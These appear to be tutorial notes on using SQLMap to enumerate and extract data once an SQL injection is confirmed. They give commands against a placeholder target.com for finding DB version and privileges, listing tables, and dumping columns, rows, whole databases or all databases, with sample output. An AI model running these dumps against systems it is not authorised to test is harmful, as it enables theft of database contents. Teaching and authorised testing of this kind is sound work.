
## Enumeration

Enumeration means extracting information from the vulnerable database after SQL injection is confirmed.

Goal:

* Find DB details
* Find tables/columns
* Dump data

---

# SQLMap Data Exfiltration

SQLMap has predefined SQL queries for each DBMS (MySQL, PostgreSQL, Oracle, etc.).

Example for MySQL:

* `--banner` → uses `VERSION()`
* `--current-user` → uses `CURRENT_USER()`
* `--current-db` → uses `DATABASE()`

Blind SQLi:

* Data retrieved slowly
* Row by row
* Character by character

UNION/Error-based:

* Faster
* Data shown directly in response

---

# Basic Enumeration

## Get DB Information

Command:

```bash
sqlmap -u "http://target.com?id=1" --banner --current-user --current-db --is-dba
```

Options:

| Option           | Purpose                |
| ---------------- | ---------------------- |
| `--banner`       | DB version             |
| `--current-user` | Current DB user        |
| `--current-db`   | Current database       |
| `--is-dba`       | Check admin privileges |

Example output:

```text
banner: '5.1.41'
current user: 'root@%'
current database: 'testdb'
current user is DBA: True
```

---

# Table Enumeration

## List Tables

```bash
sqlmap -u "http://target.com?id=1" --tables -D testdb
```

* `--tables` → list tables
* `-D` → specify database

Example:

```text
users
data
member
```

---

# Dump Table Data

## Dump Full Table

```bash
sqlmap -u "http://target.com?id=1" --dump -D testdb -T users
```

* `--dump` → extract data
* `-T` → specify table

---

# Column Enumeration

## Dump Specific Columns

```bash
sqlmap -u "http://target.com?id=1" --dump -D testdb -T users -C name,surname
```

* `-C` → select columns

---

# Row Enumeration

## Dump Specific Rows

```bash
sqlmap -u "http://target.com?id=1" --dump -D testdb -T users --start=2 --stop=3
```

Options:

| Option    | Purpose      |
| --------- | ------------ |
| `--start` | Starting row |
| `--stop`  | Ending row   |

---

# Conditional Enumeration

## Dump Rows with Condition

```bash
sqlmap -u "http://target.com?id=1" --dump -D testdb -T users --where="name LIKE 'f%'"
```

* `--where` → apply SQL WHERE condition

Example:

* Dump users whose name starts with `f`

---

# Full Database Dump

## Dump Entire Database

```bash
sqlmap -u "http://target.com?id=1" --dump -D testdb
```

Without `-T`:

* Dumps all tables from database

---

# Dump All Databases

```bash
sqlmap -u "http://target.com?id=1" --dump-all
```

Dumps:

* All databases
* All tables
* All data

---

# Exclude System Databases

```bash
sqlmap -u "http://target.com?id=1" --dump-all --exclude-sysdbs
```

* Skips system DBs
* Faster and cleaner output

Examples of skipped DBs:

* information_schema
* mysql
* performance_schema

---

# Useful Enumeration Options

| Option             | Use              |
| ------------------ | ---------------- |
| `--banner`         | DB version       |
| `--current-user`   | Current user     |
| `--current-db`     | Current database |
| `--is-dba`         | Check admin      |
| `--tables`         | List tables      |
| `--columns`        | List columns     |
| `--dump`           | Dump data        |
| `--dump-all`       | Dump everything  |
| `-D`               | Database         |
| `-T`               | Table            |
| `-C`               | Columns          |
| `--start`          | Start row        |
| `--stop`           | Stop row         |
| `--where`          | SQL condition    |
| `--exclude-sysdbs` | Skip system DBs  |
